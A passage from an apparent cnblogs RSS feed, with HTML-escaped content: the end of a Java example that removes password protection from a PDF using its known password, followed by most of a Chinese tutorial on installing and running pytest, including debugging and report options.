    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;创建PdfDocument实例&lt;/span&gt;
        PdfDocument doc = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; PdfDocument();
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加载带密码保护的PDF文件&lt;/span&gt;
        doc.loadFromFile(&quot;Encrypt.pdf&quot;, &quot;123456&quot;&lt;span&gt;);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;解除文档中的密码保护&lt;/span&gt;
        doc.getSecurity().encrypt(&quot;&quot;, &quot;&quot;, PdfPermissionsFlags.getDefaultPermissions(), PdfEncryptionKeySize.Key_256_Bit, &quot;test&quot;&lt;span&gt;);
        
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存文件&lt;/span&gt;
        doc.saveToFile(&quot;Decrypt.pdf&quot;&lt;span&gt;);
        doc.close();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;运行程序后，生成的文档将不再受密码保护。&lt;/p&gt;

&lt;p&gt;（本文完）&lt;/p&gt;
&lt;p&gt;转载请注明出处。&lt;/p&gt;
</description>
<pubDate>Wed, 09 Jan 2019 06:59:00 +0000</pubDate>
<dc:creator>E-iceblue</dc:creator>
<og:description>本篇文章将介绍通过Java编程来设置PDF文档保护的方法。我们可以设置仅用于查阅文档的密码，即该通过该密码打开文档仅用于文档阅读，无法编辑；也可以设置文档编辑权限的密码，即通过该密码打开文档时，文档为</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Yesi/p/10244405.html</dc:identifier>
</item>
<item>
<title>iOS自动化探索（四）自动化测试框架pytest安装和使用 - 周希</title>
<link>http://www.cnblogs.com/zhouxihi/p/10244320.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhouxihi/p/10244320.html</guid>
<description>&lt;h2&gt;自动化测试框架 - pytest&lt;/h2&gt;
&lt;p&gt;pytest是Python最流行的单元测试框架之一, 帮助更便捷的编写测试脚本， 并支持多种功能复杂的测试场景， 能用来做app测试也能用作函数测试&lt;/p&gt;
&lt;p&gt;官方文档: &lt;a href=&quot;https://docs.pytest.org/en/latest/&quot; target=&quot;_blank&quot;&gt;https://docs.pytest.org/en/latest/&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;pytest具有以下优点:&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;允许使用assert进行断言 &lt;/li&gt;
&lt;li&gt;自动识别测试脚本、类、函数&lt;/li&gt;
&lt;li&gt;可用于管理小型或者参数类型的测试数据或资源&lt;/li&gt;
&lt;li&gt;兼容unittest和nose测试框架&lt;/li&gt;
&lt;li&gt;支持Python2.7/Python3.4+&lt;/li&gt;
&lt;li&gt;丰富的插件支持，超过315个插件支持&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;pytest安装&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pip install -U pytest
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果提示下面的错误，说明是pip的版本太老了， 要更新下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  Could not find a version that satisfies the requirement pytest (from versions: )
No matching distribution found for pytest&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;更新方式:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
easy_install --upgrade pip
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;官方示例&lt;/h2&gt;
&lt;p&gt;准备一个test_sample.py, 内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;def inc(x):
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; x + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;

def test_answer():
    assert inc(&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;) == &lt;span&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在文件所在目录执行:&lt;/p&gt;

&lt;p&gt;这里我们做下说明：&lt;/p&gt;
&lt;p&gt;pytest脚本都以test_xxx.py为文件名；&lt;/p&gt;
&lt;p&gt;inc方法是我们定义的一个自增函数，该函数将传递进来的参数加1后返回；&lt;/p&gt;
&lt;p&gt;test_answer是我们编写的一个测试函数，其中我们使用基本的断言语句assert来对结果进行验证，测试函数以test_xxx作为命名&lt;/p&gt;

&lt;p&gt;执行结果如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
============================================================ test session starts ============================================================&lt;span&gt;
platform darwin &lt;/span&gt;-- Python &lt;span&gt;2.7&lt;/span&gt;.&lt;span&gt;15&lt;/span&gt;, pytest-&lt;span&gt;4.1&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;, py-&lt;span&gt;1.7&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;, pluggy-&lt;span&gt;0.8&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
rootdir: &lt;/span&gt;/Users/jackey/Documents/iOS/code/iOS-Auto/&lt;span&gt;Agent_Test, inifile:
collected &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt; item                                                                                                                            

test_sample.py F                                                                                                                      [&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;%&lt;span&gt;]

&lt;/span&gt;================================================================= FAILURES ==================================================================&lt;span&gt;
________________________________________________________________ test_answer ________________________________________________________________

    def test_answer():
&lt;/span&gt;&amp;gt;       assert inc(&lt;span&gt;3&lt;/span&gt;) == &lt;span&gt;5&lt;/span&gt;&lt;span&gt;
E       assert &lt;/span&gt;&lt;span&gt;4&lt;/span&gt; == &lt;span&gt;5&lt;/span&gt;&lt;span&gt;
E        &lt;/span&gt;+  &lt;span&gt;where&lt;/span&gt; &lt;span&gt;4&lt;/span&gt; = inc(&lt;span&gt;3&lt;/span&gt;&lt;span&gt;)

test_sample.py:&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;&lt;span&gt;: AssertionError
&lt;/span&gt;========================================================= &lt;span&gt;1&lt;/span&gt; failed &lt;span&gt;in&lt;/span&gt; &lt;span&gt;0.05&lt;/span&gt; seconds ==========================================================&lt;span&gt;
(wda_python) bash&lt;/span&gt;-&lt;span&gt;3.2&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当执行到assert inc(3) == 5时，报错&lt;/p&gt;

&lt;p&gt;执行pytest会在当前目录和子目录中寻找test_xx.py的测试文件，并进入到测试文件中寻找test_xx开头的测试函数开始执行&lt;/p&gt;
&lt;p&gt;执行pytest -q  test_xxx.py是执行执行的脚本&lt;/p&gt;

&lt;p&gt;在看一个例子,测试指定错误： (Assert that a certain exception is raised)&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import pytest

def f():
    raise SystemExit(&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)

def test_mytest():
    with pytest.raises(SystemExit):
        f()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;执行指令：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
pytest -q test_sysexit.py
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
(wda_python) bash-&lt;span&gt;3.2&lt;/span&gt;$ pytest -&lt;span&gt;q test_sysexit.py 
.                                                                                                                                      [&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;%&lt;span&gt;]
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt; passed &lt;span&gt;in&lt;/span&gt; &lt;span&gt;0.04&lt;/span&gt;&lt;span&gt; seconds
(wda_python) bash&lt;/span&gt;-&lt;span&gt;3.2&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如果要开发多个测试方法，可以把方法写进一个class中&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;class&lt;/span&gt; TestClass(&lt;span&gt;object&lt;/span&gt;&lt;span&gt;):
    def test_one(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        assert &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;h&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; x

    def test_two(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        assert hasattr(x, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;pytest能够自动识别类中的测试方法， 也不用我们去创建子类或者实实例, 运行结果如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
(wda_python) bash-&lt;span&gt;3.2&lt;/span&gt;$ pytest -&lt;span&gt;q test_sample.py 
.F                                                                                                                                     [&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;%&lt;span&gt;]
&lt;/span&gt;================================================================== FAILURES ==================================================================&lt;span&gt;
_____________________________________________________________ TestClass.test_two _____________________________________________________________

self &lt;/span&gt;= &amp;lt;test_sample.TestClass &lt;span&gt;object&lt;/span&gt; at &lt;span&gt;0x102e151d0&lt;/span&gt;&amp;gt;&lt;span&gt;

    def test_two(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&amp;gt;       assert hasattr(x, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
E       AssertionError: assert False
E        &lt;/span&gt;+  &lt;span&gt;where&lt;/span&gt; False = hasattr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

test_sample.py:&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;: AssertionError
&lt;/span&gt;&lt;span&gt;1&lt;/span&gt; failed, &lt;span&gt;1&lt;/span&gt; passed &lt;span&gt;in&lt;/span&gt; &lt;span&gt;0.08&lt;/span&gt;&lt;span&gt; seconds
(wda_python) bash&lt;/span&gt;-&lt;span&gt;3.2&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;除了直接在脚本路径执行pytest外， 还可以用以下方式&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
python -m pytest xxx.py
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;出现第一个（或第N个）错误时停止&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
pytest -&lt;span&gt;x            # stop after first failure
pytest &lt;/span&gt;--maxfail=&lt;span&gt;2&lt;/span&gt;    # stop after two failures
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;运行执行测试脚本&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest test_mod.py
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;运行指定目录下的所有脚本&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest testing/
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;运行包含指定关键字的测试方法, 可以是文件名、类名、测试函数名&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
pytest -k &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;MyClass and not method&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;执行node id运行测试脚本，每一个被收集的测试方法都会分配一个指定的id， 我们可以用一下方式运行执行的测试方法:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# To run a specific test within a module
pytest test_mod.py::test_func     

# To run a test within a &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;
pytest test_mod.py::TestClass::test_method&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;日志打印的不同方式&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
pytest --showlocals # show local variables &lt;span&gt;in&lt;/span&gt;&lt;span&gt; tracebacks
pytest &lt;/span&gt;-&lt;span&gt;l           # show local variables (shortcut)

pytest &lt;/span&gt;--tb=auto    # (&lt;span&gt;default&lt;/span&gt;) &lt;span&gt;'&lt;/span&gt;&lt;span&gt;long&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; tracebacks &lt;span&gt;for&lt;/span&gt;&lt;span&gt; the first and last
                     # entry, but &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;short&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; style &lt;span&gt;for&lt;/span&gt;&lt;span&gt; the other entries
pytest &lt;/span&gt;--tb=&lt;span&gt;long&lt;/span&gt;&lt;span&gt;    # exhaustive, informative traceback formatting
pytest &lt;/span&gt;--tb=&lt;span&gt;short&lt;/span&gt;&lt;span&gt;   # shorter traceback format
pytest &lt;/span&gt;--tb=&lt;span&gt;line    # only one line per failure
pytest &lt;/span&gt;--tb=&lt;span&gt;native  # Python standard library formatting
pytest &lt;/span&gt;--tb=no      # no traceback at all
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;测试报告&lt;/p&gt;
&lt;p&gt;pytest默认是完整的测试报告， 我们可以加上-r标签显示简短测试报告，可再搭配一下参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
Here &lt;span&gt;is&lt;/span&gt;&lt;span&gt; the full list of available characters that can be used:

f &lt;/span&gt;-&lt;span&gt; failed
E &lt;/span&gt;-&lt;span&gt; error
s &lt;/span&gt;-&lt;span&gt; skipped
x &lt;/span&gt;-&lt;span&gt; xfailed
X &lt;/span&gt;-&lt;span&gt; xpassed
p &lt;/span&gt;-&lt;span&gt; passed
P &lt;/span&gt;-&lt;span&gt; passed with output
a &lt;/span&gt;- all except pP
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;可以多个参数一起使用&lt;/p&gt;

&lt;p&gt;Debug模式&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest --pdb
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;示例:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
(wda_python) bash-&lt;span&gt;3.2&lt;/span&gt;$ pytest --&lt;span&gt;pdb
&lt;/span&gt;========================================================== test session starts ===========================================================&lt;span&gt;
platform darwin &lt;/span&gt;-- Python &lt;span&gt;2.7&lt;/span&gt;.&lt;span&gt;15&lt;/span&gt;, pytest-&lt;span&gt;4.1&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;, py-&lt;span&gt;1.7&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;, pluggy-&lt;span&gt;0.8&lt;/span&gt;.&lt;span&gt;0&lt;/span&gt;&lt;span&gt;
rootdir: &lt;/span&gt;/Users/jackey/Documents/iOS/code/iOS-Auto/&lt;span&gt;Agent_Test, inifile:
collected &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;&lt;span&gt; items                                                                                                                        

test_sample.py .F
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; traceback &amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&lt;span&gt;

self &lt;/span&gt;= &amp;lt;test_sample.TestClass &lt;span&gt;object&lt;/span&gt; at &lt;span&gt;0x10e928610&lt;/span&gt;&amp;gt;&lt;span&gt;

    def test_two(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&amp;gt;       assert hasattr(x, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
E       AssertionError: assert False
E        &lt;/span&gt;+  &lt;span&gt;where&lt;/span&gt; False = hasattr(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)

test_sample.py:&lt;/span&gt;&lt;span&gt;8&lt;/span&gt;&lt;span&gt;: AssertionError
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; entering PDB &amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;
&amp;gt; /Users/jackey/Documents/iOS/code/iOS-Auto/Agent_Test/test_sample.py(&lt;span&gt;8&lt;/span&gt;&lt;span&gt;)test_two()
&lt;/span&gt;-&amp;gt; assert hasattr(x, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
(Pdb) print x
hello
(Pdb) print hasattr(x,&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
False
(Pdb) &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;还可以指定第几次失败开始进入debug:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
pytest -x --&lt;span&gt;pdb   # drop to PDB on first failure, then end test session
pytest &lt;/span&gt;--pdb --maxfail=&lt;span&gt;3&lt;/span&gt;  # drop to PDB &lt;span&gt;for&lt;/span&gt; first three failures
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在debug中可以通过以下方式获取最后报错的内容&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;(Pdb) import sys
(Pdb) sys.last_traceback.tb_lineno
&lt;/span&gt;&lt;span&gt;1357&lt;/span&gt;&lt;span&gt;
(Pdb) sys.last_value
AssertionError(u&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;assert False\n +  where False = hasattr('hello', 'check')&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,)
(Pdb) &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;在执行一开始就进入到debug模式&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest --trace
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输入next执行下一步, exit退出&lt;/p&gt;

&lt;p&gt;脚本中设置断点&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import pdb

pdb.set_trace()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import pdb

&lt;/span&gt;&lt;span&gt;class&lt;/span&gt; TestClass(&lt;span&gt;object&lt;/span&gt;&lt;span&gt;):
    def test_one(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&lt;span&gt;
        pdb.set_trace()&lt;/span&gt;
        assert &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;h&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &lt;span&gt;in&lt;/span&gt;&lt;span&gt; x

    def test_two(self):
        x &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hello&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;
        assert hasattr(x, &lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;check&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;获取执行最慢的n个测试步骤&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest --durations=&lt;span&gt;10&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
======================================================= slowest &lt;span&gt;10&lt;/span&gt; test durations ========================================================&lt;span&gt;

(&lt;/span&gt;&lt;span&gt;0.00&lt;/span&gt; durations hidden.  Use -vv to show these durations.)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;但如果所有脚本的运行时间都小于0.01s, 就不显示了， 除非带上-vv参数&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
pytest --durations=&lt;span&gt;10&lt;/span&gt; -vv
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;输出结果:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
======================================================= slowest &lt;span&gt;10&lt;/span&gt; test durations ========================================================
&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s call     test_sample.py::TestClass::test_two
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s setup    test_sysexit.py::test_mytest
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s setup    test_sample.py::TestClass::test_two
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s setup    test_sample.py::TestClass::test_one
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s teardown test_sample.py::TestClass::test_two
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s teardown test_sample.py::TestClass::test_one
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s call     test_sysexit.py::test_mytest
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s teardown test_sysexit.py::test_mytest
&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;.00s call     test_sample.py::TestClass::test_one
&lt;/span&gt;=================================================== &lt;span&gt;1&lt;/span&gt; failed, &lt;span&gt;2&lt;/span&gt; passed &lt;span&gt;in&lt;/span&gt; &lt;span&gt;0.06&lt;/span&gt; seconds ===================================================&lt;span&gt;
(wda_python) bash&lt;/span&gt;-&lt;span&gt;3.2&lt;/span&gt;$ 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;将日志保存到指定文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest --resultlog=path
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;Disabling plugins&lt;/h2&gt;
&lt;p&gt;To disable loading specific plugins at invocation time, use the &lt;code class=&quot;docutils literal notranslate&quot;&gt;&lt;span class=&quot;pre&quot;&gt;-p&lt;/span&gt;&lt;/code&gt; option together with the prefix &lt;code class=&quot;docutils literal notranslate&quot;&gt;&lt;span class=&quot;pre&quot;&gt;no:&lt;/span&gt;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Example: to disable loading the plugin &lt;code class=&quot;docutils literal notranslate&quot;&gt;&lt;span class=&quot;pre&quot;&gt;doctest&lt;/span&gt;&lt;/code&gt;, which is responsible for executing doctest tests from text files, invoke pytest like this:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
pytest -p no:doctest
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;我们也可以在pytestdemo脚本中去启动pytest:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import pytest

pytest.main()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;执行python pytestdemo.py就可以执行pytest&lt;/p&gt;
&lt;p&gt;main()不会抛出SystemExit的异常, 但会返回exitcode, 一共有6种exitcode&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
Exit code &lt;span&gt;0&lt;/span&gt;&lt;span&gt;:    All tests were collected and passed successfully
Exit code &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;:    Tests were collected and run but some of the tests failed
Exit code &lt;/span&gt;&lt;span&gt;2&lt;/span&gt;&lt;span&gt;:    Test execution was interrupted by the user
Exit code &lt;/span&gt;&lt;span&gt;3&lt;/span&gt;:    Internal error happened &lt;span&gt;while&lt;/span&gt;&lt;span&gt; executing tests
Exit code &lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;:    pytest command line usage error
Exit code &lt;/span&gt;&lt;span&gt;5&lt;/span&gt;:    No tests were collected
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们试着加上打印&lt;/p&gt;
